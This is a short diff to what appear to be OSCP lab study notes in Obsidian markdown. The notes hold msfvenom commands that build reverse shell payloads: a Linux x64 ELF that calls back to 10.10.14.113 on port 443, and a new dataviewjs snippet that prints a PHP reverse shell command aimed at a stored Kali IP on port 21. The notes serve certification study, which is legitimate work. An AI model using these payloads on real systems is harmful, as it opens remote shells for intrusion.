@@ -5,6 +5,16 @@ msfvenom -l payloads
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 ```
+
+PHP reverse shell | PORT 21 | `phpreverseshell.php`
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p php/reverse_php LHOST=${KaliIP} LPORT=21 -f raw > phpreverseshell.php`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 #### Call MSFvenom
 
   Crafting Payloads with MSFvenom
